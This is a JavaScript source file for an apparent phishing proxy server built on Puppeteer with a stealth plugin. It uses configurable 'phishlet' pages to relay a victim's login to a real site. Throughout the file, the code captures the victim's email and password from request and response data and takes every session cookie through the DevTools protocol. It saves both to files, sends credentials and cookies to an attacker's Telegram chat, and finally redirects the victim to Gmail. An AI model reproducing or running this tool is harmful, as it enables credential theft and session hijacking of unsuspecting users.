const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const express = require('express');
const https = require('https');
const http = require('http');
const { Server } = require('socket.io');
const chalk = require('chalk');
const TelegramBot = require('node-telegram-bot-api');
const { loadConfig } = require('./config');
const { logCapture } = require('./table');

const logFile = fs.createWriteStream(path.join(__dirname, 'server.log'), { flags: 'a' });
const log = (message) => {
  logFile.write(`${new Date().toISOString()} - ${message}\n`);
  console.log(message);
};

async function runServer() {
  const config = loadConfig();
  const proxyConfig = require(`./proxy_page/${config.phishlet}.js`);

  let bot;
  if (config.TELEGRAM_BOT_TOKEN && config.TELEGRAM_CHAT_ID) {
    bot = new TelegramBot(config.TELEGRAM_BOT_TOKEN, { polling: false });
  }

  const stealthPlugin = StealthPlugin();
  stealthPlugin.enabledEvasions.delete('iframe.contentWindow');
  stealthPlugin.enabledEvasions.delete('media.codecs');
  puppeteer.use(stealthPlugin);

  const app = express();
  const server = config.SCHEME === 'https'
    ? https.createServer({ key: fs.readFileSync('key.pem'), cert: fs.readFileSync('cert.pem') }, app)
    : http.createServer(app);

  const io = new Server(server, { cors: { origin: '*' } });

  app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'domdiffer.html')));
  app.get('/iframeScript.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'iframeScript.html')));
  app.get('/domdiffer.js', (req, res) => res.sendFile(path.join(__dirname, 'public', 'domdiffer.js')));
  app.get('/domdifferscript.js', (req, res) => res.sendFile(path.join(__dirname, 'public', 'domdifferscript.js')));
  app.get('/jquery.js', (req, res) => res.sendFile(path.join(__dirname, 'public', 'jquery.js')));
  app.get('/getContent', (req, res) => {
    const url = decodeURIComponent(req.query.url);
    const filepath = path.join(config.CACHED_RESOURCES_DIR, url);
    if (fs.existsSync(filepath)) {
      const data = JSON.parse(fs.readFileSync(filepath));
      res.setHeader('Content-Type', data.mime);
      res.send(data.mime.startsWith('text/') ? data.data : Buffer.from(data.data, 'base64'));
    } else {
      res.status(404).send('File not found');
    }
  });

  if (!fs.existsSync(config.CACHED_RESOURCES_DIR)) {
    fs.mkdirSync(config.CACHED_RESOURCES_DIR, { recursive: true });
  }

  io.on('connection', async (socket) => {
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    let email, password;

    const puppet = await puppeteer.launch({
      headless: false,
      devtools: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--ignore-certificate-errors', '--disable-web-security'],
    });

    socket.on('disconnect', async () => {
      try {
        await puppet.close();
      } catch (error) {
        log(chalk.red(`Closing error Puppeteer: ${error.message}`));
      }
    });

    const page = await puppet.newPage();
    page.on('load', async () => {
      const currentUrl = await page.url();
      log(`Navigating to target URL: ${currentUrl}`);
      socket.emit('updateBrowserUrl', { url: new URL(currentUrl).pathname + new URL(currentUrl).search + new URL(currentUrl).hash });
    });

    page.on('response', async (response) => {
      try {
        const request = response.request();
        const requestBody = request.postData();
        if (requestBody && requestBody.includes('f.req') && !email && proxyConfig.capture_fields.email) {
          const responseBody = await response.text();
          const emailRegex = proxyConfig.capture_fields.email.search;
          const matches = responseBody.match(emailRegex);
          if (matches && matches.length > 0) {
            email = matches[0];
            log(chalk.green.bold(`Successful login capture: ${email}`));
          }
        }
      } catch (error) {
        log(chalk.red(`Response processing error: ${error.message}`));
      }
    });

    page.on('request', async (request) => {
      try {
        const postData = request.postData();
        if (postData && postData.includes('f.req=') && !password && proxyConfig.capture_fields.password) {
          const passRegex = proxyConfig.capture_fields.password.search;
          const match = postData.match(passRegex);
          if (match && match[1]) {
            password = match[1];
            log(chalk.green.bold(`Successful password capture: ${password}`));
          }
        }
      } catch (error) {
        log(chalk.red(`Error processing request: ${error.message}`));
      }
    });

    page.on('response', async (response) => {
      if (response.url().includes('recaptcha')) {
        log(chalk.red('Detected CAPTCHA, repeat'));
        await page.waitForTimeout(5000);
        await page.reload({ waitUntil: 'networkidle0' });
      }
    });

    page.on('load', async () => {
      const currentUrl = page.url();
      if (proxyConfig.auth_urls.some(url => currentUrl.includes(url)) && email && password) {
        try {
          const client = await page.target().createCDPSession();
          await client.send('Network.enable');
          const { cookies } = await client.send('Network.getAllCookies');
          await client.detach();

          log(chalk.green.bold(`Successful cookie capture: ${cookies.length} шт.`));
          const userAgent = await page.evaluate(() => navigator.userAgent);
          const decodedPassword = password ? decodeURIComponent(password) : password;

          const captureData = {
            page: config.phishlet,
            ip: clientIp,
            link: currentUrl,
            domain: config.domain,
            cookies: cookies.length,
            token: 'N/A',
            password: decodedPassword,
            logs: 'Captured',
            time: new Date().toISOString(),
            language: 'N/A',
          };

          logCapture(captureData);

          const credentials = `[Captured Creds]
          IP: ${clientIp}
          Username: ${email}
          Password: ${decodedPassword}
          User-Agent: ${userAgent}
`;

          log(chalk.green.bold(credentials));

          const credentialsFilePath = `${email}.txt`;
          fs.writeFileSync(credentialsFilePath, credentials, 'utf8');
          log(chalk.green.bold(`Saved to file: ${credentialsFilePath}`));

          const cookiesFilePath = `${email}_cookies.txt`;
          fs.writeFileSync(cookiesFilePath, JSON.stringify(cookies, null, 2), 'utf8');
          log(chalk.green.bold(`Cookies are saved to the file: ${cookiesFilePath}`));

          if (bot) {
            await bot.sendMessage(config.TELEGRAM_CHAT_ID, credentials, { parse_mode: 'Markdown' });
            log(chalk.green.bold('Data sent to Telegram'));
            await bot.sendDocument(config.TELEGRAM_CHAT_ID, cookiesFilePath, {}, { caption: 'Captured Cookies' });
            log(chalk.green.bold('Cookie sent to Telegram'));
          }

          socket.emit('redir', { url: 'https://mail.google.com' });
        } catch (error) {
          log(chalk.red(`Saving/redirection error: ${error.message}`));
        }
      }
    });

    try {
      log(`Navigating to target URL: ${config.BASE_URL}`);
      await page.goto(config.BASE_URL, { waitUntil: 'networkidle0', timeout: 60000 });
    } catch (error) {
      log(chalk.red(`Error navigating to target URL: ${error.message}`));
    }
  });

  server.listen(config.PORT, config.LOCAL_URL, () => {
    log(chalk.green.bold(`The server is running on ${config.SCHEME}://${config.LOCAL_URL}:${config.PORT}`));
  });
}

module.exports = { runServer };